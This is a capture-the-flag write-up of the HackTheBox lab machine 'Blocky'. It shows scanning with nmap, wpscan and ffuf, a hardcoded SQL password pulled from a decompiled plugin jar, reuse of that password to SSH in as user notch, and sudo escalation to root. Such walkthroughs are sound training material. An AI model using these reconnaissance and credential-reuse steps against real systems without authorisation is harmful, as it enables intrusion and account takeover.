@@ -1,0 +1,355 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Blocky | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Blocky from HackTheBox."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/17_blocky/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Blocky</h1> <p class="post-description">Blocky from HackTheBox.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/blocky/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="HTB Blocky Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br></p> <h2>Link</h2> <p><a href="https://app.hackthebox.com/Blocky" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Coming for all of Steve’s diamonds…and Blocky’s flags.</p> <p>Run nmap to get a list of available ports.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/blocky]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap 10.10.10.37 
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-28 22:22 AEDT
+Nmap scan report <span class="k">for </span>10.10.10.37
+Host is up <span class="o">(</span>0.039s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 996 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT     STATE  SERVICE VERSION
+21/tcp   open   ftp     ProFTPD 1.3.5a
+22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open   http    Apache httpd 2.4.18
+|_http-title: Did not follow redirect to http://blocky.htb
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+8192/tcp closed sophos
+Device <span class="nb">type</span>: general purpose|storage-misc|WAP|media device
+Running <span class="o">(</span>JUST GUESSING<span class="o">)</span>: Linux 3.X|4.X|2.6.X|5.X <span class="o">(</span>98%<span class="o">)</span>, Synology DiskStation Manager 7.X <span class="o">(</span>91%<span class="o">)</span>, Asus embedded <span class="o">(</span>88%<span class="o">)</span>, Amazon embedded <span class="o">(</span>88%<span class="o">)</span>
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/a:synology:diskstation_manager:7.1 cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u
+Aggressive OS guesses: Linux 3.10 - 4.11 <span class="o">(</span>98%<span class="o">)</span>, Linux 3.13 - 4.4 <span class="o">(</span>98%<span class="o">)</span>, Linux 3.2 - 4.14 <span class="o">(</span>94%<span class="o">)</span>, Linux 3.8 - 3.16 <span class="o">(</span>94%<span class="o">)</span>, Linux 3.13 or 4.2 <span class="o">(</span>92%<span class="o">)</span>, Linux 4.4 <span class="o">(</span>92%<span class="o">)</span>, Linux 2.6.32 - 3.13 <span class="o">(</span>91%<span class="o">)</span>, Synology DiskStation Manager 7.1 <span class="o">(</span>Linux 4.4<span class="o">)</span> <span class="o">(</span>91%<span class="o">)</span>, Linux 3.16 <span class="o">(</span>90%<span class="o">)</span>, Linux 3.16 - 4.6 <span class="o">(</span>90%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Network Distance: 2 hops
+Service Info: Host: 127.0.1.1<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span class="o">(</span>using port 8192/tcp<span class="o">)</span>
+HOP RTT      ADDRESS
+1   55.70 ms 10.10.16.1
+2   55.90 ms 10.10.10.37
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>20.67 seconds
+</code></pre></div></div> <p><br> Run nmap against all of the ports to get any hidden services.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/blocky]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-oN</span> nmapfull 10.10.10.37 
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-28 22:23 AEDT
+Nmap scan report <span class="k">for </span>10.10.10.37
+Host is up <span class="o">(</span>0.016s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65530 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT      STATE  SERVICE
+21/tcp    open   ftp
+22/tcp    open   ssh
+80/tcp    open   http
+8192/tcp  closed sophos
+25565/tcp open   minecraft
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>129.69 seconds
+</code></pre></div></div> <p><br> Add blocky.htb to the /etc/hosts file.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/blocky]
+└─<span class="nv">$ </span><span class="nb">cat</span> /etc/hosts 
+127.0.0.1       localhost
+127.0.1.1       kali
+10.10.10.37     blocky.htb
+
+<span class="c"># The following lines are desirable for IPv6 capable hosts</span>
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre></div></div> <p><br> Banner grab the port 25565 Minecraft server to get the version.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/blocky]
+└─<span class="nv">$ </span> <span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p</span> 21,22,80,8192,25565 <span class="nt">-oN</span> nmapspec 10.10.10.37
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-28 22:29 AEDT
+Nmap scan report <span class="k">for </span>blocky.htb <span class="o">(</span>10.10.10.37<span class="o">)</span>
+Host is up <span class="o">(</span>0.016s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE  SERVICE   VERSION
+21/tcp    open   ftp       ProFTPD 1.3.5a
+22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open   http      Apache httpd 2.4.18
+|_http-generator: WordPress 4.8
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: BlockyCraft &amp;#8211<span class="p">;</span> Under Construction!
+8192/tcp  closed sophos
+25565/tcp open   minecraft Minecraft 1.11.2 <span class="o">(</span>Protocol: 127, Message: A Minecraft Server, Users: 0/20<span class="o">)</span>
+Service Info: Host: 127.0.1.1<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.96 seconds
+</code></pre></div></div> <p><br> View the port 80 landing page. Looks like a Wordpress installation.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/blocky/landing.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the Landing Page" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Run wpscan looking for any low hanging fruit.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/blocky]
+└─<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://blocky.htb                
+_______________________________________________________________
+         __          _______   _____
+         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____|
+          <span class="se">\ \ </span> /<span class="se">\ </span> / /| |__<span class="o">)</span> | <span class="o">(</span>___   ___  __ _ _ __ ®
+           <span class="se">\ \/</span>  <span class="se">\/</span> / |  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __|/ _<span class="sb">`</span> | <span class="s1">'_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.27
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N]Y
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: http://blocky.htb/ [10.10.10.37]
+[+] Started: Tue Jan 28 22:32:36 2025
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://blocky.htb/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://blocky.htb/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://blocky.htb/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://blocky.htb/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://blocky.htb/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt;
+ |  - http://blocky.htb/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8&lt;/generator&gt;
+
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://blocky.htb/wp-content/themes/twentyseventeen/
+ | Last Updated: 2024-11-12T00:00:00.000Z
+ | Readme: http://blocky.htb/wp-content/themes/twentyseventeen/README.txt
+ | [!] The version is out of date, the latest version is 3.8
+ | Style URL: http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: '</span>Version: 1.3<span class="s1">'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:01 &lt;=============================================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:01
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Tue Jan 28 22:32:43 2025
+[+] Requests Done: 180
+[+] Cached Requests: 5
+[+] Data Sent: 43.018 KB
+[+] Data Received: 13.644 MB
+[+] Memory used: 281.621 MB
+[+] Elapsed time: 00:00:07
+</span></code></pre></div></div> <p><br> Ffuf the webserver to find any interesting directories.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/blocky]
+└─<span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-u</span> http://blocky.htb/FUZZ <span class="nt">-e</span> .txt,.bak,.php <span class="nt">-fw</span> 3306
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://blocky.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Extensions       : .txt .bak .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 3306
+________________________________________________
+
+.php                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 18ms]
+index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 51ms]
+wiki                    [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 18ms]
+wp-content              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 12ms]
+wp-login.php            [Status: 200, Size: 2397, Words: 147, Lines: 70, Duration: 32ms]
+plugins                 [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 14ms]
+license.txt             [Status: 200, Size: 19935, Words: 3334, Lines: 386, Duration: 35ms]
+wp-includes             [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 16ms]
+javascript              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 35ms]
+wp-trackback.php        [Status: 200, Size: 135, Words: 11, Lines: 5, Duration: 61ms]
+wp-admin                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 22ms]
+phpmyadmin              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 12ms]
+xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 48ms]
+.php                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 18ms]
+wp-signup.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 33ms]
+server-status           [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 16ms]
+:: Progress: [882236/882236] :: Job [1/1] :: 2564 req/sec :: Duration: [0:08:39] :: Errors: 0 ::
+</span></code></pre></div></div> <p><br> Check the plugins folder that was discovered during the brute-force.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/blocky/files.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the Plugins Page" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Download the BlockyCore.jar file.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/blocky]
+└─<span class="nv">$ </span>wget http://blocky.htb/plugins/files/BlockyCore.jar
+<span class="nt">--2025-01-28</span> 23:06:53--  http://blocky.htb/plugins/files/BlockyCore.jar
+Resolving blocky.htb <span class="o">(</span>blocky.htb<span class="o">)</span>... 10.10.10.37
+Connecting to blocky.htb <span class="o">(</span>blocky.htb<span class="o">)</span>|10.10.10.37|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 883 <span class="o">[</span>application/java-archive]
+Saving to: ‘BlockyCore.jar’
+
+BlockyCore.jar                                             100%[<span class="o">========================================================================================================================================&gt;]</span>     883  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      
+
+2025-01-28 23:06:53 <span class="o">(</span>144 MB/s<span class="o">)</span> - ‘BlockyCore.jar’ saved <span class="o">[</span>883/883]
+</code></pre></div></div> <p><br> Run jd-gui to decompile the BlockyCore.jar file.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/blocky]
+└─<span class="nv">$ </span>jd-gui BlockyCore.jar                                        
+Picked up _JAVA_OPTIONS: <span class="nt">-Dawt</span>.useSystemAAFontSettings<span class="o">=</span>on <span class="nt">-Dswing</span>.aatext<span class="o">=</span><span class="nb">true</span>
+</code></pre></div></div> <p><br> Review the code and note the sqlPass variable.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/blocky]
+└─<span class="nv">$ </span>wget http://blocky.htb/plugins/files/BlockyCore.jar
+<span class="nt">--2025-01-28</span> 23:06:53--  http://blocky.htb/plugins/files/BlockyCore.jar
+Resolving blocky.htb <span class="o">(</span>blocky.htb<span class="o">)</span>... 10.10.10.37
+Connecting to blocky.htb <span class="o">(</span>blocky.htb<span class="o">)</span>|10.10.10.37|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 883 <span class="o">[</span>application/java-archive]
+Saving to: ‘BlockyCore.jar’
+
+BlockyCore.jar                                             100%[<span class="o">========================================================================================================================================&gt;]</span>     883  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      
+
+2025-01-28 23:06:53 <span class="o">(</span>144 MB/s<span class="o">)</span> - ‘BlockyCore.jar’ saved <span class="o">[</span>883/883]
+</code></pre></div></div> <p><br> Run jd-gui to decompile the BlockyCore.jar file.</p> <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">com.myfirstplugin</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">BlockyCore</span> <span class="o">{</span>
+  <span class="kd">public</span> <span class="nc">String</span> <span class="n">sqlHost</span> <span class="o">=</span> <span class="s">"localhost"</span><span class="o">;</span>
+  
+  <span class="kd">public</span> <span class="nc">String</span> <span class="n">sqlUser</span> <span class="o">=</span> <span class="s">"root"</span><span class="o">;</span>
+  
+  <span class="kd">public</span> <span class="nc">String</span> <span class="n">sqlPass</span> <span class="o">=</span> <span class="s">"8YsqfCTnvxAUeduzjNSXe22"</span><span class="o">;</span>
+  
+  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onServerStart</span><span class="o">()</span> <span class="o">{}</span>
+  
+  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onServerStop</span><span class="o">()</span> <span class="o">{}</span>
+  
+  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onPlayerJoin</span><span class="o">()</span> <span class="o">{</span>
+    <span class="n">sendMessage</span><span class="o">(</span><span class="s">"TODO get username"</span><span class="o">,</span> <span class="s">"Welcome to the BlockyCraft!!!!!!!"</span><span class="o">);</span>
+  <span class="o">}</span>
+  
+  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">sendMessage</span><span class="o">(</span><span class="nc">String</span> <span class="n">username</span><span class="o">,</span> <span class="nc">String</span> <span class="n">message</span><span class="o">)</span> <span class="o">{}</span>
+<span class="o">}</span>
+</code></pre></div></div> <p><br> Use the wpscan to try and enumerate the users of the Wordpress installation.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;snip&gt;
+
+<span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:
+
+<span class="o">[</span>+] notch
+ | Found By: Author Posts - Author Pattern <span class="o">(</span>Passive Detection<span class="o">)</span>
+ | Confirmed By:
+ |  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ |   - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
+ |  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+<span class="o">[</span>+] Notch
+ | Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+ | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+
+ &lt;snip&gt;
+</code></pre></div></div> <p><br> Use the username from the wpscan results and the password from the source code to ssh into the machine.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/blocky]
+└─<span class="nv">$ </span>ssh notch@10.10.10.37 
+notch@10.10.10.37<span class="s1">'s password: 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+7 packages can be updated.
+7 updates are security updates.
+
+
+Last login: Fri Jul  8 07:16:08 2022 from 10.10.14.29
+-bash: cannot create temp file for here-document: No space left on device
+notch@Blocky:~$
+</span></code></pre></div></div> <p><br> Run sudo -l to get a list of all the commands that notch can use with sudo.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>notch@Blocky:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>notch: 
+Matching Defaults entries <span class="k">for </span>notch on Blocky:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User notch may run the following commands on Blocky:
+    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+</code></pre></div></div> <p><br> Use sudo su - to change to the root user.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>notch@Blocky:~<span class="nv">$ </span><span class="nb">sudo </span>su -
+root@Blocky:~# 
+</code></pre></div></div> <p><br> Get the user.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Blocky:~# <span class="nb">cat</span> /home/notch/user.txt
+&lt;redacted&gt;
+root@Blocky:~# ifconfig
+ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:57:a5  
+          inet addr:10.10.10.37  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: fe80::250:56ff:feb9:57a5/64 Scope:Link
+          inet6 addr: dead:beef::250:56ff:feb9:57a5/64 Scope:Global
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:5350339 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:5091855 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:887094307 <span class="o">(</span>887.0 MB<span class="o">)</span>  TX bytes:2474663025 <span class="o">(</span>2.4 GB<span class="o">)</span>
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:29780 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:29780 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:2368968 <span class="o">(</span>2.3 MB<span class="o">)</span>  TX bytes:2368968 <span class="o">(</span>2.3 MB<span class="o">)</span>
+</code></pre></div></div> <p><br> Get the root.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Blocky:~# <span class="nb">cat</span> /root/root.txt
+&lt;redacted&gt;
+root@Blocky:~# ifconfig
+ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:57:a5  
+          inet addr:10.10.10.37  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: fe80::250:56ff:feb9:57a5/64 Scope:Link
+          inet6 addr: dead:beef::250:56ff:feb9:57a5/64 Scope:Global
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:5440287 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:5181158 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
